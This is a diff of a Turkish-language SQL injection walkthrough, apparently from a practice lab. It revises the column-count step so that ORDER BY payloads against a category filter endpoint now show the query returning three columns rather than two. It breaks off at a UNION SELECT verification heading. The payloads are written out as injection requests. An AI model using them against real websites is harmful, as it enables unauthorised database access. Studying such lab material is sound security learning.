@@ -12,9 +12,10 @@ Hangi parametrenin savunmasız olduğunu anlamak için kategori filtresine bir t
 Veritabanını sütun numarasına göre sıralamaya zorlayarak sınırları test ediyorum:
 - `GET /filter?category=Gifts' ORDER BY 1--` -> 200 OK
 - `GET /filter?category=Gifts' ORDER BY 2--` -> 200 OK
-- `GET /filter?category=Gifts' ORDER BY 3--` -> 500 Internal Server Error
+- `GET /filter?category=Gifts' ORDER BY 3--` -> 200 OK
+- `GET /filter?category=Gifts' ORDER BY 4--` -> 500 Internal Server Error
 
-**Sonuç:** 3. sütunda hata aldığım için orijinal sorgunun **2 sütun** döndürdüğünü anlıyorum.
+**Sonuç:** 4. sütunda hata aldığım için orijinal sorgunun **3 sütun** döndürdüğünü anlıyorum.
 
 ### Adım 3: Doğrulama (UNION SELECT)
 Bulduğum sonucu `NULL` değerleri ile teyit ediyorum:
